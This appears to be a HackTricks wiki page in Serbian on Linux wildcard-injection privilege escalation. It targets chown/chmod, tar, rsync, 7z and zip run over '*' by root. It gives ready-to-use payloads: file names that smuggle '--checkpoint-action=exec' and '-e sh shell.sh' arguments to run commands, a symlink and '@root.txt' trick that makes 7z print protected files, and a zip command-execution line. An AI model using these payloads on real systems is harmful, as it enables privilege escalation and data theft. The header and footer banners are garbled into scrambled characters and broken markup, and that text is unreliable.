{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Proverite [**subsrippangithub.cm/sorsarlosp!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Delite trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Možete **naznačiti koji vlasnik datoteke i dozvole želite da kopirate za ostale datoteke**
```bash
touch "--reference=/my/own/path/filename"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinovani napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Izvršite proizvoljne komande:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Izvršite proizvoljne komande:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

U **7z** čak i korišćenjem `--` pre `*` (napomena da `--` znači da sledeći unos ne može biti tretiran kao parametri, tako da su u ovom slučaju samo putanje do datoteka) možete izazvati proizvoljnu grešku da pročitate datoteku, tako da ako se komanda poput sledeće izvršava od strane root-a:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I možete kreirati fajlove u folderu gde se ovo izvršava, mogli biste kreirati fajl `@root.txt` i fajl `root.txt` koji je **symlink** ka fajlu koji želite da pročitate:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Zatim, kada se **7z** izvrši, tretiraće `root.txt` kao datoteku koja sadrži listu datoteka koje treba da kompresuje (to je ono što postojanje `@root.txt` ukazuje) i kada 7z pročita `root.txt`, pročitaće `/file/you/want/to/read` i **pošto sadržaj ove datoteke nije lista datoteka, prikazaće grešku** koja prikazuje sadržaj.

_Više informacija u Write-ups of the box CTF from HackTheBox._

## Zip

**Izvršavanje proizvoljnih komandi:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>PodrškaHackTricks</smmay>

*Proverite [**pretplatu na github.com/sorsarlosp!**
* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Pridružite se 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
